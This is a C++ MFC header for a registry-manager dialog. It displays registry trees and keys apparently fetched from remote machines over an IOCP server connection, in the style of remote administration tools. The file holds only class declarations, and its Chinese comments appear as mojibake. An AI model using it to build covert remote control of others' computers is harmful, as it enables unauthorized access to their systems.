#pragma once
#include "_IOCPServer.h"
#include "Common.h"
#include "afxcmn.h"

// CDlgRegisterManager �Ի���

class CDlgRegisterManager : public CDialog
{
	DECLARE_DYNAMIC(CDlgRegisterManager)

public:
	CDlgRegisterManager(CWnd* pParent = NULL, _CIOCPServer* IOCPServer = NULL, PCONTEXT_OBJECT ContextObject = NULL);   // ��׼���캯��
	virtual ~CDlgRegisterManager();

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG_REGISTER_MANAGER };
#endif
private:
	_CIOCPServer* m_IOCPServer;
	PCONTEXT_OBJECT m_ContextObject;
	HICON m_IconHwnd;
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��
	
	DECLARE_MESSAGE_MAP()
public:
	CTreeCtrl m_CTreeCtrl_Dialog_Register_Manager_Show;
	CListCtrl m_CListCtrl_Dialog_Register_Manager_Show;
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	void  CDlgRegisterManager::WindowHandleIO(void);
public:
	CImageList m_ImageListTree;  //���ؼ��ϵ�ͼ��
	CImageList m_ImageListList;  //List�ؼ��ϵ�ͼ��
	HTREEITEM  m_hRoot;
	HTREEITEM  HKCU;
	HTREEITEM  HKLM;
	HTREEITEM  HKUS;
	HTREEITEM  HKCC;
	HTREEITEM  HKCR;
	HTREEITEM  m_SelectedTreeItem;
	BOOL       m_IsEnable;   //���Ƶ���򱻿ض�����
	afx_msg void OnTvnSelchangedTreeDialogRegisterManagerShow(NMHDR *pNMHDR, LRESULT *pResult);
	char CDlgRegisterManager::GetFatherPath(CString& FullPath);
	CString CDlgRegisterManager::GetFullPath(HTREEITEM Current);
	void CDlgRegisterManager::AddPath(char* BufferData);
	void CDlgRegisterManager::AddKey(char* BufferData);
};
